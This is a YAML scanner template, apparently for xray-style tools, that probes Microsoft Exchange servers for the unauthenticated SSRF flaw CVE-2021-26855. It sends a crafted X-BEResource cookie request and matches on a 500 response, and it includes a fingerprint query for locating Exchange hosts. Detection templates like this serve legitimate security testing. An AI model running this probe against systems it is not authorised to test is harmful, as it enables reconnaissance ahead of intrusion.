name: poc-yaml-microsoft-exchange-ssrf-cve-2021-26885
manual: true
transport: http
set:
  randomVirtualPathName: randomLowercase(5)
  randomFQDNPath: randomLowercase(10)
  randomVersion: randomInt(1, 100000)
rules:
  r1:
    request:
      method: GET
      path: /ecp/{{randomVirtualPathName}}.js
      follow_redirects: false
      headers:
        Cookie: X-BEResource={{randomFQDNPath}}#~{{randomVersion}}; X-AnonResource=true
    expression: response.status == 500 && response.body.bcontains(b"NegotiateSecurityContext")
expression: r1()
detail:
  author: Aurora
  links:
    - https://github.com/srvaccount/CVE-2021-26855-PoC
  description: "Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。2021年03月3日，微软官方发布了Microsoft Exchange安全更新，披露了多个高危严重漏洞，其中在 CVE-2021-26855 Exchange SSRF漏洞中，攻击者\
    可直接构造恶意请求，以Exchange server的身份发起任意HTTP请求，扫描内网，并且可获取Exchange用户信息。该漏洞利用无需身份认证"
  extra:
    dock: (app="Microsoft-Exchange" || title="Outlook")
    product: Exchange
    homepage: microsoft.com
  vulnerability:
    id: CT-150305
    level: high
